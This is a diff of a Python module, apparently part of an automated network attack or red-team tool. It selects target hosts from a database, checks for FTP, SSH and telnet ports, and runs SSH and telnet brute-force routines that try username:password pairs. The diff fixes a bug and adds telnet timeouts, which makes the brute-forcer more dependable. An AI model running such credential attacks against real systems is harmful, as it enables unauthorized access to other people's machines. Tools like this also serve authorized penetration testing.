@@ -37,7 +37,7 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
 
             if len(hostList) > 0:
                     target = max(hostList,key=hostList.get)
-                    openPorts = db.hosts.find_one({'ip' : target}['ports'])
+                    openPorts = db.hosts.find_one({'ip' : target})['ports']
 
                     if 21 in openPorts:
                         ports.append(21)
@@ -64,7 +64,7 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
                 sshBrute(target,db,hosts,monkeyId)
 
             elif ports[index] == 23:
-                 telBrute(target,db,hosts,monkeyId)
+                telBrute(target,db,hosts,monkeyId)
 
 def sshBrute(victim,db,coll,monkeyId):
     startTime = time.ctime()
@@ -141,10 +141,10 @@ def telBrute (victim,db,coll,monkeyId):
         user, pwd = creds.rstrip().split(':')
 
         try:
-            telnet = telnetlib.Telnet(victim)
-            telnet.read_until('username:')
+            telnet = telnetlib.Telnet(victim,23,5)
+            telnet.read_until('username:',timeout=5)
             telnet.write(user + '\n')
-            telnet.read_until('password:')
+            telnet.read_until('password:',timeout=5)
             telnet.write(pwd + '\n')
 
         except:
@@ -153,6 +153,7 @@ def telBrute (victim,db,coll,monkeyId):
     endTime = time.ctime()
     print 'finished telnet brute forcing of ' + victim + 'at ' + endTime
     saveResults('telnetbruteforce',db,coll,victim,23,startTime,endTime,monkeyId)
+    return
 
 def saveResults(whichBrute,dbConn,coll,target,port,startTime,endTime,monkeyId):
     action = dbConn.actions
